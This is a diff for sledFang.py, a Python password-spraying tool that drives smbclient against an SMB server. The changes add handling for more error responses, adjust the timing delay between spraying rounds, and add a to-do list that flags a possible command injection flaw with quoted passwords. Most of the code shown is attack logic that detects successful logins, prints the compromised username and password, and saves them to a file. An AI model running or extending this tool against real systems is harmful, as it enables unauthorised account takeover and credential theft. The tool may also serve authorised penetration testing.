@@ -1,5 +1,5 @@
-#! python3
-# sledFang.py -v 1.3
+#!/usr/bin/env python3
+# sledFang.py -v 1.4
 # Author- David Sullivan
 #
 # Use smbclient to password spray against a device
@@ -10,10 +10,16 @@
 # Revision  1.2     -   06/03/2019- Added new false positive, updated output to not write duplicates, added logic to
 #                                   not continue spraying against locked out account when the bypass option is used.
 # Revision  1.3     -   07/19/2019- Added colorized output, better error handling, multiprocessing
+# Revision  1.4     -   03/08/2021- Added additional error message checks, fixed issue with delay, added 'to do' list
+#                                   header
 #
 # Example Usage:
 # python3 sledFang.py -d domain -u user -p password -t 127.0.0.1 -o output.txt
 # python3 sledFang.py -d domain -U userlist.txt -P passwordlist.txt -t 127.0.0.1 -o output.txt
+#
+# To do:
+#   -Fix error with passwords containing special characters, like quotations (potential command injection vuln)
+#   -Add dictionary of good/bad terms to check responses against instead of a long list of if/elif statements
 
 import subprocess, argparse, time, multiprocessing
 # from datetime import datetime
@@ -79,7 +85,7 @@ def user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verb
         # create a pool and chunk the user list based on the number of cores, setup the command for the map function
         pool = multiprocessing.Pool(processes=threading)
         chunked_user_list = chunkUsers(user_list, threading)
-        user_command = partial(attack, domain, target_ip, output, bypass, verbose, very_verbose, password, 
+        user_command = partial(attack, domain, target_ip, output, bypass, verbose, very_verbose, password,
                                user_list_clean, temp_users)
 
         # run the for loop attack using the threaded rules
@@ -123,6 +129,9 @@ def attack(domain, target_ip, output, bypass, verbose, very_verbose, password, u
     elif answer == "Connection to %s failed (Error NT_STATUS_UNSUCCESSFUL)\n" % target_ip:
         printColor("[-] Unable to connect to server", "red")
         quit()
+    elif answer == "session setup failed: NT_STATUS_NETLOGON_NOT_STARTED\n":
+        printColor("[-] Server requires DOMAIN parameter", "red")
+        quit()
     elif answer == "":
         printColor("[-] Unable to connect to server", "red")
         quit()
@@ -163,12 +172,13 @@ def attack(domain, target_ip, output, bypass, verbose, very_verbose, password, u
     # if logon fails, drop the response, any other response, print to screen and remove account from spraying
     elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
         if answer != "session setup failed: NT_STATUS_ACCESS_DENIED\n":
-            printColor(("[+] The account %s was successfully logged into using the password %s" % (user, password)),
-                       "green")
-            temp_users.remove(user)
-            # write password to file
-            if output is not None:
-                write_output(user, password, output)
+            if answer != "session setup failed: NT_STATUS_IO_TIMEOUT\n":
+                printColor(("[+] The account %s was successfully logged into using the password %s" % (user, password)),
+                           "green")
+                temp_users.remove(user)
+                # write password to file
+                if output is not None:
+                    write_output(user, password, output)
 
 
 # this function takes all the command line arguments and starts the spraying attack
@@ -190,12 +200,12 @@ def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_li
     # create a copy of the user list to remove users if the correct password is found, or the account gets locked
     temp_users = user_list_clean[:]
     for password in password_list_clean:
-        time.sleep(delay)
         printColor(("Spraying using %s" % password), "yellow")
         # update the user_list based on found passwords or locked accounts
         user_list = temp_users[:]
         user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
                     temp_users, rate_limit, threading)
+        time.sleep(delay)
     print("Complete")
 
 
